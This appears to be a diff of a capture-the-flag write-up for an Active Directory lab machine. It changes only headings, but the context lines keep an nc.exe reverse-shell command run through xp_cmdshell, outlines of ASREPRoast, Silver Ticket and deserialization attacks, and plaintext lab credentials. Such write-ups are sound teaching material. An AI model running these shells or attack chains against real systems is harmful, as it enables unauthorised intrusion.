@@ -3,7 +3,7 @@ If Active Directory => Synchronize your NTP with the domain controller:
 ```bash
 nptdate 10.10.10.103
 ```
-# Content
+### Content
 
 - LDAP Enumeration
 * Web Enumeration
@@ -29,7 +29,7 @@ nptdate 10.10.10.103
 * DLL Inspection with Dnspy - Found a backdoor in the code
 * We realize that serialization and deserialization of data is being used
 * Creating a malicious base64 serialized Payload with ysoserial.net in order to get RCE and send the serialized data to the server [Privilege Escalation]
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 
@@ -266,7 +266,7 @@ Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop
 2023/01/21 22:46:15 >  Done! Tested 13000 usernames (5 valid) in 104.092 seconds
 ```
 
-# Exploitation
+### Exploitation
 
 ^b7b22a
 Trying to execute an ASREPRoast Attack with the previously found usernames:
@@ -459,7 +459,7 @@ output
 SQL> xp_cmdshell"C:\Temp\nc.exe -e cmd 10.10.14.2 443"
 ```
 
-# User privesc
+### User Privilege Escalation
 ##### Unintended Way:
 
 We are user sqlsvc now we need to escalate to another user, it seems like miscsvc is a good option:
@@ -538,7 +538,7 @@ $cred = New-Object System.Management.Automation.PSCredential($user, $password)
 Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
 ```
 
-# Root privesc
+### Privilege Escalation
 
 ^ee02ee
 ##### Unintended Way:
@@ -618,7 +618,7 @@ nt authority\system
 C:\Windows\system32>
 ```
 
-# Credentials
+### Credentials
 
 ```bash
 ksimpson@scrm.local:ksimpson
@@ -626,7 +626,7 @@ sqlsvc:Pegasus60 -> SPN -> MSSQLSvc/dc1.scrm.local -> NTLM HASH: b999a16500b87d1
 MiscSvc:ScrambledEggs9900
 ```
 
-# Notes
+### Notes
 
 - To exploit a Silver Ticket we need 3 parameters:
 	* DC SID
@@ -641,7 +641,7 @@ MiscSvc:ScrambledEggs9900
 	* Extract DC SID (impacket-getPac)
 	* Start an SMB Server (impacket-smbserver)
 	* Connect to an SMB Server (impacket-smbclient)
-# Resources:
+### References
 
 [SilverTicket Explanation Minuto 1:20:00](https://www.youtube.com/watch?v=osmFGqnFe8c&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29):
 ![[Pasted image 20230122223446.png]]
